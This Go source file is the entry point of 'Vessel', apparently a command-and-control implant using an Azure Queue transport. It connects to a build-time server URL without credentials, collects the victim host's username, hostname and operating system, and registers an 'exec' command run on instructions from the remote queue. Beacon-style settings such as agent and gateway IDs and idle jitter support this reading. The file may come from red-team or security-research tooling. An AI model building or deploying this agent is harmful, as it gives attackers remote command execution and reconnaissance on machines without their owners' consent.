//go:build transport_azqueue && !transport_nats

package main

import (
	"context"
	"net/http"
	"os"
	"os/signal"
	"os/user"
	"runtime"

	"github.com/Azure/azure-sdk-for-go/sdk/azcore"
	"github.com/Azure/azure-sdk-for-go/sdk/storage/azqueue/v2"

	"github.com/foohq/vessel/commands"
	execcmd "github.com/foohq/vessel/commands/exec"
	"github.com/foohq/vessel/internal/consumer"
	"github.com/foohq/vessel/internal/publisher"
	"github.com/foohq/vessel/internal/service"
	"github.com/foohq/vessel/log"
)

const (
	AgentID               = ""
	GatewayID             = ""
	ServerURL             = ""
	ServerCertificate     = ""
	StreamName            = ""
	ConsumerName          = ""
	AwaitMessagesDuration = "" // time.Duration
	IdleDuration          = "" // time.Duration
	IdleJitter            = "" // time.Duration
)

func main() {
	log.Debug("Vessel started")
	defer log.Debug("Vessel stopped")

	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt)
	defer cancel()

	conn, err := connect(ServerURL)
	if err != nil {
		log.Debug("Cannot connect to the server", "server", ServerURL, "error", err)
		return
	}

	registry := commands.NewRegistry()
	registry.Add("exec", execcmd.New(nil))

	err = service.New(service.Arguments{
		Consumer: consumer.NewQueueConsumer(consumer.QueueConsumerConfig{
			Connection: conn,
		}),
		Publisher: publisher.NewQueuePublisher(publisher.QueuePublisherConfig{
			AgentID:    AgentID,
			GatewayID:  GatewayID,
			Connection: conn,
		}),
		ConnChecker: NewConnChecker(),
		HostInfo:    NewHostInfo(),
		Commands:    registry,
	}).Start(ctx)
	if err != nil {
		log.Debug("Cannot start the agent", "error", err)
		return
	}
}

type ConnChecker struct{}

func NewConnChecker() *ConnChecker {
	return &ConnChecker{}
}

func (c *ConnChecker) Status() service.Status {
	return service.StatusConnected
}

type HostInfo struct{}

func NewHostInfo() *HostInfo {
	return &HostInfo{}
}

func (h *HostInfo) Username() string {
	usr, err := user.Current()
	if err != nil {
		return ""
	}
	return usr.Username
}

func (h *HostInfo) Hostname() string {
	hostname, err := os.Hostname()
	if err != nil {
		return ""
	}
	return hostname
}

func (h *HostInfo) System() string {
	return runtime.GOOS
}

func (h *HostInfo) Address() string {
	return ""
}

type Transporter struct {
	cli *http.Client
}

func NewTransporter() *Transporter {
	return &Transporter{
		cli: &http.Client{
			Transport: &http.Transport{
				Proxy: nil,
			},
			Timeout: 30,
		},
	}
}

func (t *Transporter) Do(req *http.Request) (*http.Response, error) {
	return t.cli.Do(req)
}

func connect(server string) (*azqueue.QueueClient, error) {
	conn, err := azqueue.NewQueueClientWithNoCredential(server, &azqueue.ClientOptions{
		ClientOptions: azcore.ClientOptions{
			Transport: NewTransporter(),
		},
	})
	if err != nil {
		log.Debug("Cannot connect to the server", "server", server, "error", err)
		return nil, err
	}

	return conn, nil
}
